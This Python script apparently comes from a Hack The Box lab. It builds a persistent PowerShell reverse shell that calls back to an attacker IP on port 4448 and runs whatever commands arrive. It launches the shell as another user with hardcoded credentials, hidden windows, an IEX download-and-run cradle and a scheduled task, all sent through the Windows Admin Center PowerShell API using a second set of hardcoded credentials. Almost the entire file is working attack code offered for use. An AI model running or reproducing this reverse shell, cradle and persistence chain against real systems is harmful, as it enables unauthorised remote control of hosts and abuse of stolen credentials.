#!/usr/bin/env python3
"""Spawn durable noah reverse shell via CreateProcessWithLogonW (seclogon).

Modes:
  enc      — powershell -enc (no HTTP cradle)
  iex      — IEX DownloadString cradle
  schtasks — Task Scheduler as noah (often needs admin)
  start    — CPWL cmd /c start "" to further detach
  all      — enc + iex + start (default)
"""
import argparse
import base64
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/danglingtree/scripts")
from wac_ps import WAC

DEFAULT_LHOST = "10.10.15.62"
DEFAULT_PORT = 4448
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def build_rev_ps1(lhost: str, port: int) -> str:
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$LHOST='{lhost}'
$PORT={port}
while($true){{
  try{{
    $c=New-Object Net.Sockets.TCPClient($LHOST,$PORT)
    $s=$c.GetStream()
    $w=New-Object IO.StreamWriter($s); $w.AutoFlush=$true
    $w.WriteLine("NOAH-STABLE $([Environment]::UserDomainName)\$([Environment]::UserName) $env:COMPUTERNAME $(Get-Date -Format o)")
    [byte[]]$b=New-Object byte[] 65536
    while(($i=$s.Read($b,0,$b.Length)) -gt 0){{
      $d=[Text.Encoding]::UTF8.GetString($b,0,$i)
      try{{$r=Invoke-Expression $d 2>&1|Out-String}}catch{{$r=$_.Exception.ToString()}}
      $o=$r+"PS $((Get-Location).Path)> "
      $x=[Text.Encoding]::UTF8.GetBytes($o)
      $s.Write($x,0,$x.Length); $s.Flush()
    }}
    $c.Close()
  }}catch{{}}
  Start-Sleep -Seconds 3
}}
""".strip()


def ps_unicode_b64(script: str) -> str:
    return base64.b64encode(script.encode("utf-16le")).decode("ascii")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--lhost", default=DEFAULT_LHOST)
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--mode", choices=["enc", "iex", "schtasks", "start", "all"], default="all")
    args = ap.parse_args()

    rev = build_rev_ps1(args.lhost, args.port)
    enc = ps_unicode_b64(rev)
    with open("/tmp/dt-upload/noah_stable.ps1", "w") as f:
        f.write(rev + "\n")

    url = f"http://{args.lhost}:8000/noah_stable.ps1"
    modes = ["enc", "iex", "start"] if args.mode == "all" else [args.mode]

    # Core CPWL helper
    script = r'''
$ErrorActionPreference='Continue'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class STCP {
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool CreateProcessWithLogonW(
    string user, string domain, string pass, int logonFlags,
    string app, string cmd, int flags, IntPtr env, string cwd,
    ref SI si, out PI pi);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool CloseHandle(IntPtr h);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct SI {
    public int cb; public string lpReserved, lpDesktop, lpTitle;
    public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;
    public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
  }
  [StructLayout(LayoutKind.Sequential)]
  public struct PI { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
}
"@
function Invoke-NoahCPWL([string]$app, [string]$cmdLine, [int]$logonFlags, [int]$createFlags) {
  $si = New-Object STCP+SI
  $si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
  $pi = New-Object STCP+PI
  $ok = [STCP]::CreateProcessWithLogonW(
    'noah.b','danglingtree','RiverDragon#Storm25',
    $logonFlags, $app, $cmdLine, $createFlags,
    [IntPtr]::Zero, 'C:\Windows\Temp', [ref]$si, [ref]$pi)
  $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
  "CPWL ok=$ok err=$err pid=$($pi.dwProcessId) app=$app cf=0x$($createFlags.ToString('X')) lf=$logonFlags"
  if ($pi.hProcess -ne [IntPtr]::Zero) { [void][STCP]::CloseHandle($pi.hProcess) }
  if ($pi.hThread -ne [IntPtr]::Zero) { [void][STCP]::CloseHandle($pi.hThread) }
  return $ok
}
$ps = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
'''

    if "enc" in modes:
        # lpApplicationName=powershell, lpCommandLine must start with quoted exe per MS quirks
        cmd = f'"{PS}" -NoP -NonI -w Hidden -enc {enc}'
        cmd_esc = cmd.replace("'", "''")
        script += f'''
"--- enc ---"
$cmd = '{cmd_esc}'
# LOGON_WITH_PROFILE=1, CREATE_NO_WINDOW
[void](Invoke-NoahCPWL $ps $cmd 1 0x08000000)
# LOGON_WITH_PROFILE + CREATE_NEW_CONSOLE
[void](Invoke-NoahCPWL $ps $cmd 1 0x00000010)
# null app name — let cmd line parse exe
[void](Invoke-NoahCPWL $null $cmd 1 0x08000000)
'''

    if "start" in modes:
        # cmd.exe /c start launches detached child of cmd which exits
        inner = f'powershell.exe -NoP -NonI -w Hidden -enc {enc}'
        # start "" "title optional" command
        cmd = f'cmd.exe /c start /b "" {inner}'
        cmd_esc = cmd.replace("'", "''")
        script += f'''
"--- start detach ---"
$cmd = '{cmd_esc}'
[void](Invoke-NoahCPWL 'C:\\Windows\\System32\\cmd.exe' $cmd 1 0x08000000)
[void](Invoke-NoahCPWL $null $cmd 1 0x00000000)
'''

    if "iex" in modes:
        # Keep IEX short
        inner = f"IEX((New-Object Net.WebClient).DownloadString('{url}'))"
        # Escape for embedding in PS double-quotes inside single-quoted python→ps
        cmd = f'"{PS}" -NoP -w Hidden -c "{inner}"'
        cmd_esc = cmd.replace("'", "''")
        script += f'''
"--- iex ---"
$cmd = '{cmd_esc}'
[void](Invoke-NoahCPWL $ps $cmd 1 0x08000000)
'''

    if "schtasks" in modes:
        script += f'''
"--- schtasks ---"
$tn = 'DtNoahStable'
$tr = 'powershell.exe -NoP -w Hidden -enc {enc}'
cmd /c "schtasks /Delete /TN `"$tn`" /F" 2>&1 | Out-String | ForEach-Object {{ "DEL: $_" }}
$create = cmd /c "schtasks /Create /TN `"$tn`" /TR `"$tr`" /SC ONCE /ST 23:59 /RU danglingtree\\noah.b /RP RiverDragon#Storm25 /RL LIMITED /F" 2>&1 | Out-String
"CREATE: $create"
$run = cmd /c "schtasks /Run /TN `"$tn`"" 2>&1 | Out-String
"RUN: $run"
'''

    w = WAC(user="anderson.w", password="R3dT3am@Acc3ss#01")
    body = {"properties": {"script": script, "command": None, "module": None, "state": "ready"}}
    print(f"[*] modes={modes} lhost={args.lhost} port={args.port} enc_len={len(enc)}")
    rr = w.s.post(
        w.base + "/api/nodes/localhost/features/powershellApi/invokeCommand",
        headers=w.headers,
        json=body,
        timeout=120,
    )
    j = rr.json()
    print("completed", j.get("completed"))
    for x in j.get("results") or []:
        if isinstance(x, str):
            print(x, end="" if x.endswith("\n") else "\n")
        elif not isinstance(x, bool):
            print(x)
    if j.get("exception"):
        print("EXC", str(j["exception"])[:1200])
        sys.exit(1)


if __name__ == "__main__":
    main()
